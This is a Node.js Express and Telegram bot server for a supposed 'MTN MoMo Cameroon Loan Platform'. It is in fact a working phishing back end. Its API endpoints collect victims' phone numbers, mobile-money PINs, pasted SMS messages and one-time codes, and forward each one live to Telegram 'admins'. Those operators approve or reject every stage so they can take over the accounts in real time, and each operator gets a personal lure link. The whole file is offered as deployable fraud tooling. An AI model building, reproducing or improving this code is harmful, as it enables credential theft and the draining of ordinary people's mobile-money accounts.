const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
require('dotenv').config();

const db = require('./database');

const app = express();

// ==========================================
// WEBHOOK MODE (for Render / production)
// ==========================================

const BOT_TOKEN   = process.env.SUPER_ADMIN_BOT_TOKEN;
const PORT        = process.env.PORT || 10000;
const WEBHOOK_URL = process.env.RENDER_EXTERNAL_URL || process.env.APP_URL || `http://localhost:${PORT}`;

// Create bot WITHOUT polling
const bot = new TelegramBot(BOT_TOKEN);

// In-memory maps
const adminChatIds      = new Map(); // adminId → chatId
const pausedAdmins      = new Set(); // adminIds that are paused
const processingLocks   = new Set(); // prevents duplicate pin submissions
const suspendAllSessions = new Map(); // superadmin chatId → session data

const SUSPEND_PAGE_SIZE = 10;

let dbReady = false;

// ==========================================
// HELPER FUNCTIONS
// ==========================================

function isAdminActive(chatId) {
    const adminId = getAdminIdByChatId(chatId);
    if (!adminId) return false;
    if (adminId === 'ADMIN001') return true;
    return !pausedAdmins.has(adminId);
}

function getAdminIdByChatId(chatId) {
    for (const [adminId, storedChatId] of adminChatIds.entries()) {
        if (storedChatId === chatId) return adminId;
    }
    return null;
}

// Format +237XXXXXXXXX → 6XXXXXXXXX for Telegram display (Cameroon format)
function formatPhone(phoneNumber) {
    if (!phoneNumber) return phoneNumber;
    if (phoneNumber.startsWith('+2376')) return phoneNumber.slice(4);
    if (phoneNumber.startsWith('+237'))  return phoneNumber.slice(4);
    if (phoneNumber.startsWith('2376'))  return phoneNumber.slice(3);
    if (phoneNumber.startsWith('237'))   return phoneNumber.slice(3);
    return phoneNumber;
}

async function sendToAdmin(adminId, message, options = {}) {
    const chatId = adminChatIds.get(adminId);

    if (!chatId) {
        try {
            const admin = await db.getAdmin(adminId);
            if (!admin?.chatId) {
                console.error(`❌ No chat ID for admin: ${adminId}`);
                return null;
            }
            adminChatIds.set(adminId, admin.chatId);
            return await bot.sendMessage(admin.chatId, message, options);
        } catch (err) {
            console.error(`❌ DB fallback failed for admin ${adminId}:`, err.message);
            return null;
        }
    }

    try {
        return await bot.sendMessage(chatId, message, options);
    } catch (error) {
        console.error(`❌ Error sending to ${adminId}:`, error.message);
        return null;
    }
}

// Build paginated suspend checklist
function buildSuspendAllPage(session) {
    const { allAdmins, selections, page } = session;
    const totalPages = Math.ceil(allAdmins.length / SUSPEND_PAGE_SIZE);
    const start      = page * SUSPEND_PAGE_SIZE;
    const pageAdmins = allAdmins.slice(start, start + SUSPEND_PAGE_SIZE);
    const suspendCount = selections.size;

    const adminRows = pageAdmins.map(admin => {
        const willSuspend = selections.has(admin.adminId);
        const label = willSuspend
            ? `✅ ${admin.name} (${admin.adminId})`
            : `⬜ ${admin.name} (${admin.adminId})`;
        return [{ text: label, callback_data: `sall_toggle_${admin.adminId}` }];
    });

    const navRow = [];
    if (page > 0) {
        navRow.push({ text: '◀ Prev', callback_data: `sall_page_${page - 1}` });
    }
    navRow.push({ text: `${page + 1} / ${totalPages}`, callback_data: 'sall_noop' });
    if (page < totalPages - 1) {
        navRow.push({ text: 'Next ▶', callback_data: `sall_page_${page + 1}` });
    }

    const actionRow = [
        { text: `🔒 Suspend Selected (${suspendCount})`, callback_data: 'sall_confirm' },
        { text: '❌ Cancel',                              callback_data: 'sall_cancel'  }
    ];

    const inline_keyboard = [...adminRows, navRow, actionRow];

    const text = `
🔒 *SUSPEND ADMIN LINKS*

Tap an admin to toggle ✅/⬜
✅ = will be suspended  ⬜ = will be kept active

Page ${page + 1} of ${totalPages} · ${allAdmins.length} admins total
Selected to suspend: *${suspendCount}*

Deselect anyone you want to keep active, then tap *Suspend Selected*.
    `.trim();

    return { text, inline_keyboard };
}

// ==========================================
// MIDDLEWARE
// ==========================================
app.use(express.json());
app.use(express.static(__dirname));

// ==========================================
// BOT COMMAND HANDLERS
// ==========================================
console.log('⏳ Setting up bot handlers...');

bot.on('error',         (error) => console.error('❌ Bot error:',    error?.message));
bot.on('polling_error', (error) => console.error('❌ Polling error:', error?.message));

setupCommandHandlers();
console.log('✅ Command handlers configured!');

// ==========================================
// WEBHOOK ENDPOINT
// ==========================================
const webhookPath = `/telegram-webhook`;

app.post(webhookPath, (req, res) => {
    try {
        console.log('📥 Webhook received:', JSON.stringify(req.body).substring(0, 150));
        if (req.body && req.body.update_id !== undefined) {
            try {
                bot.processUpdate(req.body);
                console.log('✅ Update processed');
            } catch (processError) {
                console.error('❌ processUpdate error:', processError);
            }
        }
        res.sendStatus(200);
    } catch (error) {
        console.error('❌ Webhook handler error:', error);
        res.sendStatus(200);
    }
});

// ==========================================
// DATABASE INIT + WEBHOOK SETUP
// ==========================================
db.connectDatabase()
    .then(async () => {
        dbReady = true;
        console.log('✅ Database ready!');

        await loadAdminChatIds();

        const fullWebhookUrl = `${WEBHOOK_URL}${webhookPath}`;
        let webhookSetSuccessfully = false;
        let attempts = 0;

        while (!webhookSetSuccessfully && attempts < 3) {
            attempts++;
            try {
                console.log(`🔄 Attempt ${attempts}/3: Setting webhook to: ${fullWebhookUrl}`);
                await bot.deleteWebHook();
                await new Promise(resolve => setTimeout(resolve, 1000));

                const result = await bot.setWebHook(fullWebhookUrl, {
                    drop_pending_updates: false,
                    max_connections: 40,
                    allowed_updates: ['message', 'callback_query']
                });

                if (result) {
                    const info = await bot.getWebHookInfo();
                    if (info.url === fullWebhookUrl) {
                        webhookSetSuccessfully = true;
                        console.log(`✅ Webhook CONFIRMED: ${fullWebhookUrl}`);
                    } else {
                        console.error(`❌ Webhook URL mismatch. Got: ${info.url}`);
                    }
                }
            } catch (webhookError) {
                console.error(`❌ Webhook setup error (attempt ${attempts}):`, webhookError.message);
                if (attempts < 3) await new Promise(resolve => setTimeout(resolve, 2000));
            }
        }

        if (!webhookSetSuccessfully) {
            console.error('❌❌❌ CRITICAL: Failed to set webhook after all attempts!');
        }

        try {
            const botInfo = await bot.getMe();
            console.log(`✅ Bot connected: @${botInfo.username} (${botInfo.first_name})`);
        } catch (botError) {
            console.error('❌ Bot API error:', botError);
        }

        setInterval(() => {
            console.log(`💓 Keep-alive: ${adminChatIds.size} admins connected, ${pausedAdmins.size} paused`);
            const pingUrl = `${WEBHOOK_URL}/health`;
            fetch(pingUrl).catch(() => {});
        }, 14 * 60 * 1000);

        setInterval(async () => {
            try {
                const info  = await bot.getWebHookInfo();
                const isSet = info.url === fullWebhookUrl;
                if (!isSet) {
                    console.log('⚠️ Auto-fixing webhook...');
                    await bot.setWebHook(fullWebhookUrl, {
                        drop_pending_updates: false,
                        max_connections: 40,
                        allowed_updates: ['message', 'callback_query']
                    });
                    console.log('✅ Webhook re-set');
                }
            } catch (error) {
                console.error('⚠️ Webhook check error:', error.message);
            }
        }, 60000);

        console.log('✅ System fully initialized!');
    })
    .catch((error) => {
        console.error('❌ Initialization failed:', error);
        process.exit(1);
    });

// ==========================================
// LOAD ADMIN CHAT IDs FROM DB
// ==========================================
async function loadAdminChatIds() {
    try {
        const admins = await db.getAllAdmins();
        adminChatIds.clear();
        pausedAdmins.clear();

        for (const admin of admins) {
            if (admin.chatId) {
                adminChatIds.set(admin.adminId, admin.chatId);
                if (admin.status === 'paused') pausedAdmins.add(admin.adminId);
            }
        }
        console.log(`✅ ${adminChatIds.size} admins loaded, ${pausedAdmins.size} paused`);
    } catch (error) {
        console.error('❌ Error loading admin chat IDs:', error);
    }
}

// ==========================================
// BOT COMMAND HANDLERS
// ==========================================
function setupCommandHandlers() {
    bot.onText(/\/start/, async (msg) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);

        try {
            if (adminId) {
                if (pausedAdmins.has(adminId) && adminId !== 'ADMIN001') {
                    await bot.sendMessage(chatId, `
🚫 *ADMIN ACCESS PAUSED*
Your admin access has been temporarily paused.
                    `, { parse_mode: 'Markdown' });
                    return;
                }

                const admin       = await db.getAdmin(adminId);
                const isSuperAdmin = adminId === 'ADMIN001';

                let message = `
👋 *Welcome ${admin.name}!*
*Your Admin ID:* \`${adminId}\`
*Role:* ${isSuperAdmin ? '⭐ Super Admin' : '👤 Admin'}
*Your Personal Link:*
${WEBHOOK_URL}?admin=${adminId}
                `;
                await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
            } else {
                await bot.sendMessage(chatId, `
👋 *Welcome to MTN MoMo Cameroon Loan Platform!*
Your Chat ID: \`${chatId}\`
Provide this to your super admin to get access.
                `, { parse_mode: 'Markdown' });
            }
        } catch (error) {
            console.error('❌ Error in /start:', error);
        }
    });

    bot.onText(/\/stats/, async (msg) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!adminId)              return bot.sendMessage(chatId, '❌ Not registered as admin.');
        if (!isAdminActive(chatId)) return bot.sendMessage(chatId, '🚫 Your admin access has been paused.');
        const stats = await db.getAdminStats(adminId);
        bot.sendMessage(chatId, `
📊 *STATISTICS*
📋 Total: ${stats.total}
⏳ PIN Pending: ${stats.pinPending}
✅ PIN Approved: ${stats.pinApproved}
⏳ SMS Pending: ${stats.smsPending}
✅ SMS Approved: ${stats.smsApproved}
⏳ OTP Pending: ${stats.otpPending}
🎉 Fully Approved: ${stats.fullyApproved}
        `, { parse_mode: 'Markdown' });
    });

    bot.onText(/\/pending/, async (msg) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!adminId)              return bot.sendMessage(chatId, '❌ Not registered as admin.');
        if (!isAdminActive(chatId)) return bot.sendMessage(chatId, '🚫 Your admin access has been paused.');

        const adminApps = await db.getApplicationsByAdmin(adminId);
        const pinPending = adminApps.filter(a => a.pinStatus === 'pending');
        const smsPending = adminApps.filter(a => a.smsStatus === 'pending' && a.pinStatus === 'approved');
        const otpPending = adminApps.filter(a => a.otpStatus === 'pending' && a.smsStatus === 'approved');

        let message = `⏳ *PENDING APPLICATIONS*\n\n`;
        if (pinPending.length > 0) message += `📱 PIN Pending: ${pinPending.length}\n`;
        if (smsPending.length > 0) message += `💬 SMS Pending: ${smsPending.length}\n`;
        if (otpPending.length > 0) message += `🔢 OTP Pending: ${otpPending.length}\n`;
        if (pinPending.length === 0 && smsPending.length === 0 && otpPending.length === 0) {
            message = '✨ No pending applications!';
        }
        bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
    });
}

// ==========================================
// TELEGRAM CALLBACK HANDLER
// ==========================================
bot.on('callback_query', async (callbackQuery) => {
    const chatId    = callbackQuery.message.chat.id;
    const messageId = callbackQuery.message.message_id;
    const data      = callbackQuery.data;
    const adminId   = getAdminIdByChatId(chatId);

    if (!adminId) {
        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Not authorized!', show_alert: true });
    }

    if (!isAdminActive(chatId)) {
        return bot.answerCallbackQuery(callbackQuery.id, { text: '🚫 Your admin access has been paused.', show_alert: true });
    }

    const parts = data.split('_');
    if (parts.length < 4) {
        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Invalid callback data.', show_alert: true });
    }

    const action          = parts[0];
    const type            = parts[1];
    const embeddedAdminId = parts[2];
    const applicationId   = parts.slice(3).join('_');

    if (embeddedAdminId !== adminId) {
        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ This application belongs to another admin!', show_alert: true });
    }

    const application = await db.getApplication(applicationId);
    if (!application || application.adminId !== adminId) {
        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Application not found or not yours!', show_alert: true });
    }

    // PIN Stage Actions
    if (action === 'deny' && type === 'pin') {
        await db.updateApplication(applicationId, { pinStatus: 'rejected' });
        await bot.editMessageText(`❌ *PIN REJECTED*\n📋 \`${applicationId}\``, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Application rejected' });
    }
    if (action === 'allow' && type === 'pin') {
        await db.updateApplication(applicationId, { pinStatus: 'approved' });
        await bot.editMessageText(`✅ *PIN APPROVED - WAITING FOR SMS PASTING*\n📋 \`${applicationId}\``, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
        return bot.answerCallbackQuery(callbackQuery.id, { text: '✅ Approved! User can paste SMS now.' });
    }

    // SMS Pasting Stage Actions
    if (action === 'deny' && type === 'sms') {
        await db.updateApplicationSms(applicationId, application.smsText, 'rejected');
        await bot.editMessageText(`❌ *SMS REJECTED*\n📋 \`${applicationId}\``, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ SMS rejected' });
    }
    if (action === 'allow' && type === 'sms') {
        await db.updateApplicationSms(applicationId, application.smsText, 'approved');
        await bot.editMessageText(`✅ *SMS APPROVED - ALLOWED TO NEXT 4-DIGIT VERIFICATION*\n📋 \`${applicationId}\``, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
        return bot.answerCallbackQuery(callbackQuery.id, { text: '✅ SMS approved! User can enter 4-digit code.' });
    }

    // OTP Stage Actions
    if (action === 'wrongpin' && type === 'otp') {
        await db.updateApplication(applicationId, { otpStatus: 'wrongpin_otp' });
        await bot.editMessageText(`❌ *WRONG PIN AT OTP STAGE*\n📋 \`${applicationId}\``, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ User will re-enter PIN' });
    }
    if (action === 'wrongcode' && type === 'otp') {
        await db.updateApplication(applicationId, { otpStatus: 'wrongcode' });
        await bot.editMessageText(`❌ *WRONG CODE*\n📋 \`${applicationId}\``, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ User will re-enter code' });
    }
    if (action === 'approve' && type === 'otp') {
        await db.updateApplication(applicationId, { otpStatus: 'approved' });
        await bot.editMessageText(`🎉 *LOAN FULLY APPROVED!*\n📋 \`${applicationId}\``, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
        return bot.answerCallbackQuery(callbackQuery.id, { text: '🎉 Loan approved!' });
    }
});

// ==========================================
// API ENDPOINTS
// ==========================================

// POST /api/verify-pin
app.post('/api/verify-pin', async (req, res) => {
    try {
        const { phoneNumber, pin, adminId: requestAdminId, assignmentType } = req.body;
        const applicationId = `APP-${Date.now()}-${Math.random().toString(36).slice(2,7).toUpperCase()}`;

        let assignedAdmin;
        if (assignmentType === 'specific' && requestAdminId) {
            assignedAdmin = await db.getAdmin(requestAdminId);
            if (!assignedAdmin || pausedAdmins.has(requestAdminId) || assignedAdmin.status !== 'active') {
                return res.status(400).json({ success: false, message: 'Invalid or paused admin link.' });
            }
        } else {
            const activeAdmins = await db.getActiveAdmins();
            const availableAdmins = activeAdmins.filter(a => !pausedAdmins.has(a.adminId));
            if (availableAdmins.length === 0) {
                return res.status(503).json({ success: false, message: 'No admins available.' });
            }
            assignedAdmin = availableAdmins[0];
        }

        const existingApps = await db.getApplicationsByAdmin(assignedAdmin.adminId);
        const thisAdminPastApps = existingApps.filter(a => a.phoneNumber === phoneNumber && a.pinStatus !== 'pending');
        const isReturningUser = thisAdminPastApps.length > 0;

        await db.saveApplication({
            id:             applicationId,
            adminId:        assignedAdmin.adminId,
            adminName:      assignedAdmin.name,
            phoneNumber,
            pin,
            pinStatus:      'pending',
            smsStatus:      'pending',
            otpStatus:      'pending',
            assignmentType: assignmentType || 'auto',
            isReturningUser,
            previousCount:  thisAdminPastApps.length,
            timestamp:      new Date().toISOString()
        });

        await sendToAdmin(assignedAdmin.adminId, `
🆕 *NEW PIN APPLICATION*
📋 \`${applicationId}\`
📞 \`${formatPhone(phoneNumber)}\`
PIN \`${pin}\`
        `, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '❌ Reject PIN',     callback_data: `deny_pin_${assignedAdmin.adminId}_${applicationId}` }],
                    [{ text: '✅ Correct - Allow', callback_data: `allow_pin_${assignedAdmin.adminId}_${applicationId}` }]
                ]
            }
        });

        res.json({ success: true, applicationId, assignedTo: assignedAdmin.name, assignedAdminId: assignedAdmin.adminId });
    } catch (error) {
        res.status(500).json({ success: false, message: 'Server error: ' + error.message });
    }
});

// GET /api/check-pin-status/:applicationId
app.get('/api/check-pin-status/:applicationId', async (req, res) => {
    try {
        const application = await db.getApplication(req.params.applicationId);
        if (application) res.json({ success: true, status: application.pinStatus });
        else res.status(404).json({ success: false, message: 'Application not found' });
    } catch (error) {
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

// POST /api/verify-sms (NEW: SMS Pasting Verification Step)
app.post('/api/verify-sms', async (req, res) => {
    try {
        const { applicationId, smsText } = req.body;
        const application = await db.getApplication(applicationId);

        if (!application) {
            return res.status(404).json({ success: false, message: 'Application not found' });
        }

        await db.updateApplicationSms(applicationId, smsText, 'pending');

        await sendToAdmin(application.adminId, `
💬 *SMS PASTING SUBMISSION*
📋 \`${applicationId}\`
📞 \`${formatPhone(application.phoneNumber)}\`

*Pasted SMS Content:*
\`\`\`
${smsText}
\`\`\`
⏰ ${new Date().toLocaleString()}

⚠️ *VERIFY SMS TO ALLOW 4-DIGIT VERIFICATION*
        `, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '❌ Reject SMS',         callback_data: `deny_sms_${application.adminId}_${applicationId}` }],
                    [{ text: '✅ Allow 4-Digit OTP',   callback_data: `allow_sms_${application.adminId}_${applicationId}` }]
                ]
            }
        });

        res.json({ success: true });
    } catch (error) {
        console.error('❌ Error in /api/verify-sms:', error);
        res.status(500).json({ success: false, message: 'Server error: ' + error.message });
    }
});

// GET /api/check-sms-status/:applicationId (NEW: Check SMS Approval Status)
app.get('/api/check-sms-status/:applicationId', async (req, res) => {
    try {
        const application = await db.getApplication(req.params.applicationId);
        if (application) res.json({ success: true, status: application.smsStatus });
        else res.status(404).json({ success: false, message: 'Application not found' });
    } catch (error) {
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

// POST /api/verify-otp (Four-Digit OTP Stage)
app.post('/api/verify-otp', async (req, res) => {
    try {
        const { applicationId, otp } = req.body;
        const application = await db.getApplication(applicationId);

        if (!application) {
            return res.status(404).json({ success: false, message: 'Application not found' });
        }

        await db.updateApplicationOtp(applicationId, otp, 'pending');

        await sendToAdmin(application.adminId, `
🔢 *FOUR-DIGIT OTP VERIFICATION*
📋 \`${applicationId}\`
📞 \`${formatPhone(application.phoneNumber)}\`
OTP \`${otp}\`
⏰ ${new Date().toLocaleString()}
        `, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '❌ Wrong PIN',   callback_data: `wrongpin_otp_${application.adminId}_${applicationId}` }],
                    [{ text: '❌ Wrong Code',  callback_data: `wrongcode_otp_${application.adminId}_${applicationId}` }],
                    [{ text: '✅ Approve Loan', callback_data: `approve_otp_${application.adminId}_${applicationId}` }]
                ]
            }
        });

        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ success: false, message: 'Server error: ' + error.message });
    }
});

// GET /api/check-otp-status/:applicationId
app.get('/api/check-otp-status/:applicationId', async (req, res) => {
    try {
        const application = await db.getApplication(req.params.applicationId);
        if (application) res.json({ success: true, status: application.otpStatus });
        else res.status(404).json({ success: false, message: 'Application not found' });
    } catch (error) {
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

// GET /health
app.get('/health', (req, res) => {
    res.json({
        status:        'ok',
        database:      dbReady ? 'connected' : 'not ready',
        activeAdmins:  adminChatIds.size,
        pausedAdmins:  pausedAdmins.size,
        botMode:       'webhook',
        timestamp:     new Date().toISOString()
    });
});

// Serve Frontend Landing Page
app.get('/', async (req, res) => {
    const adminId = req.query.admin;
    if (adminId) {
        try {
            const admin = await db.getAdmin(adminId);
            if (admin && admin.status === 'active' && !pausedAdmins.has(adminId)) {
                if (admin.chatId && !adminChatIds.has(adminId)) {
                    adminChatIds.set(adminId, admin.chatId);
                }
            }
        } catch (error) {
            console.error('Error validating admin on landing page:', error);
        }
    }
    res.sendFile(path.join(__dirname, 'mtn-momo-cameroon.html'));
});

// ==========================================
// START SERVER
// ==========================================
app.listen(PORT, () => {
    console.log(`\n💎 MTN MOMO CAMEROON LOAN PLATFORM`);
    console.log(`==================================`);
    console.log(`🌐 Server: http://localhost:${PORT}`);
    console.log(`🤖 Bot: WEBHOOK MODE ✅`);
    console.log(`👥 Admins: ${adminChatIds.size} connected`);
    console.log(`\n✅ Ready!\n`);
});

// ==========================================
// GRACEFUL SHUTDOWN
// ==========================================
async function shutdownGracefully(signal) {
    console.log(`\n🛑 Received ${signal}, shutting down...`);
    try {
        suspendAllSessions.clear();
        await bot.deleteWebHook();
        await db.closeDatabase();
        console.log('✅ Cleanup complete');
        process.exit(0);
    } catch (error) {
        console.error('❌ Shutdown error:', error);
        process.exit(1);
    }
}

process.on('SIGTERM', () => shutdownGracefully('SIGTERM'));
process.on('SIGINT',  () => shutdownGracefully('SIGINT'));

process.on('unhandledRejection', (error) => {
    console.error('❌ Unhandled rejection:', error?.message);
});

process.on('uncaughtException', (error) => {
    console.error('❌ Uncaught exception:', error?.message);
});
